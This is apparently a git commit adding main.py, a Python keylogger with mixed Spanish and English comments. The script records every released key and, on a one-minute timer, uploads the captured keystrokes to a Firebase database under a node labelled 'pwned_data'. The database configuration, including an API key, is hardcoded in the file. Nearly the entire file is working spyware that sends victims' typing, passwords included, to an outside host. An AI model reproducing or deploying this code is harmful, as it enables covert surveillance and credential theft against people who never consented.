f43eaed1abda41b0cf2f08dc3a99391cb8fb8b90
runesc <luisalfredoreyes98@gmail.com>
2022-02-13 05:43:12 +0000

    first commit

---
+++ main.py
@@ -0,0 +1,105 @@
+from datetime import datetime
+from threading import Timer
+
+from flask import appcontext_popped
+from xcffib import ConnectionException # esto lo usaremos si en firebase damos la orden de actualizar cada x tiempo
+import keyboard
+import pyrebase
+
+SEND_REPORT_EVERY = False # firebase actualizará esto si es necesario
+FIREBASE_CONFIG = {
+  "apiKey": "AIzaSyASImtbY7l-Tl61K-ALF9glbsoOKWVsKDg",
+  "authDomain": "keyloggerpy-864c1.firebaseapp.com",
+  "databaseURL": "https://keyloggerpy-864c1-default-rtdb.firebaseio.com",
+  "storageBucket": "keyloggerpy-864c1.appspot.com"
+}
+
+
+FIREBASE = pyrebase.initialize_app(FIREBASE_CONFIG)
+DATABASE = FIREBASE.database()
+
+import keyboard # for keylogs
+import smtplib # for sending email using SMTP protocol (gmail)
+# Timer is to make a method runs after an `interval` amount of time
+from threading import Timer
+from datetime import datetime
+SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
+
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            if self.report_method == "file":
+                print("seding to firebase")
+                time = datetime.now()
+                DATABASE.child("pwned_data").child(f"{time.day}_{time.month}_{time.year}__{time.hour}_{time.minute}_{time.second}").set({"data": str(self.log)})
+
+            # if you want to print in the console, uncomment below line
+            # print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
+    
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+
+    
+if __name__ == "__main__":
+    # if you want a keylogger to send to your email
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want a keylogger to record keylogs to a local file 
+    # (and then send it using your favorite method)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
